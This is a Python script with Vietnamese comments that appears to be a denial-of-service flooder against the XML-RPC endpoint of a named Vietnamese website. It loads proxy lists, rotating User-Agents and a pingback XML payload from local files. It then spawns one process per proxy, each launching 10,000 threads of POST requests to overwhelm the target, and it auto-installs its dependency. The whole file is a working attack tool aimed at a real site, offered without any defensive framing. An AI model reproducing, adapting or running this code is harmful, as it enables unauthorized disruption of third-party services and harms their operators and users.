import sys
import subprocess
import random
import time

# Tự động cài đặt module nếu chưa có
def install_module(module_name):
    try:
        __import__(module_name)
        print(f"Module {module_name} already installed.")
    except ImportError:
        print(f"Module {module_name} not found. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
            print(f"Module {module_name} installed successfully.")
        except subprocess.CalledProcessError:
            print(f"Failed to install {module_name}. Please install it manually using 'pip install {module_name}'.")
            sys.exit(1)

# Cài đặt module cần thiết
install_module("requests")

# Import các module sau khi đảm bảo chúng đã được cài đặt
import requests
import threading
from multiprocessing import Process

# Mục tiêu
target = "https://casta.com.vn/xmlrpc.php"

# Danh sách các tệp proxy
proxy_files = ["proxies1.txt", "proxies2.txt", "proxies3.txt", "proxies4.txt"]

# Đọc danh sách proxy từ các tệp
def load_proxies():
    proxies = []
    for file_name in proxy_files:
        try:
            with open(file_name, "r") as file:
                for line in file:
                    proxy = line.strip()
                    if proxy:  # Kiểm tra dòng không rỗng
                        proxies.append({"http": proxy, "https": proxy})
        except FileNotFoundError:
            print(f"File {file_name} not found. Skipping...")
    return proxies

# Đọc danh sách User-Agent từ tệp ua.txt
def load_user_agents():
    try:
        with open("ua.txt", "r") as file:
            user_agents = [line.strip() for line in file if line.strip()]
        if not user_agents:
            print("No User-Agents found in ua.txt. Using default User-Agent.")
            return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]
        return user_agents
    except FileNotFoundError:
        print("File ua.txt not found. Using default User-Agent.")
        return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

# Đọc payload từ tệp pingback.xml
def load_payload():
    try:
        with open("pingback.xml", "r") as file:
            return file.read()
    except FileNotFoundError:
        print("File pingback.xml not found. Please create it with the required payload.")
        sys.exit(1)

# Gửi yêu cầu pingback.ping
def send_pingback(proxy=None):
    try:
        payload = load_payload()
        user_agents = load_user_agents()
        headers = {
            "Content-Type": "text/xml",
            "User-Agent": random.choice(user_agents)
        }
        response = requests.post(target, data=payload, headers=headers, proxies=proxy, timeout=3)
        print(f"Sent pingback: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Gửi hàng loạt yêu cầu trong một batch
def attack_batch(proxy, num_requests=10000):
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_pingback, args=(proxy,))
        threads.append(thread)
        thread.start()
        time.sleep(0.01)  # Delay nhỏ để tránh quá tải tức thời
    for thread in threads:
        thread.join()

# Phân chia công việc cho các tiến trình
if __name__ == "__main__":
    proxies = load_proxies()
    if not proxies:
        print("No proxies loaded. Exiting...")
        exit(1)

    num_processes = len(proxies)
    processes = []

    for i in range(num_processes):
        proxy = proxies[i]
        process = Process(target=attack_batch, args=(proxy,))
        processes.append(process)
        process.start()

    for process in processes:
        process.join()